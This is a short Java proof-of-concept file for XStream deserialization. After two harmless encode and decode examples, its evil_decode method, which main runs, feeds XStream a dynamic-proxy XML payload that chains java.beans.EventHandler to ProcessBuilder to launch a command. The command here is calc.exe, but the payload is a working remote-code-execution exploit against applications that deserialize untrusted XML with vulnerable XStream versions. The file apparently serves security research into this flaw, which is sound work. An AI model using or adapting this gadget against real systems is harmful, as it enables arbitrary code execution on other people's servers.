package com.SugarP1g.deserialization.XStream;

import com.thoughtworks.xstream.*;
import com.thoughtworks.xstream.io.xml.DomDriver;

public class POC {
    public static void encode() {
        Person p = new Person();
        p.age = 6;
        p.name = "mi1k7ea";
        XStream xstream = new XStream(new DomDriver());
        String xml = xstream.toXML(p);
        System.out.println(xml.getClass());
        System.out.println(xml);
    }

    public static void decode() {
        String xml = "<com.huawei.icsl.Person>\n" +
                "  <name>mi1k7ea</name>\n" +
                "  <age>6</age>\n" +
                "</com.huawei.icsl.Person>";

        XStream xstream = new XStream(new DomDriver());
        Person p = (Person) xstream.fromXML(xml);
        p.output();
    }

    public static void evil_decode() {
        String xml = "<dynamic-proxy>\n" +
                "        <interface>java.lang.Comparable</interface>\n" +
                "        <handler class=\"java.beans.EventHandler\">\n" +
                "            <target class=\"java.lang.ProcessBuilder\">\n" +
                "                <command>\n" +
                "                    <string>calc.exe</string>\n" +
                "                </command>\n" +
                "            </target>\n" +
                "            <action>start</action>\n" +
                "        </handler>\n" +
                "    </dynamic-proxy>";
        XStream xstream = new XStream(new DomDriver());
        Person p = (Person) xstream.fromXML(xml);
        p.output();
    }

    public static void main(String[] args) {
        evil_decode();
    }
}
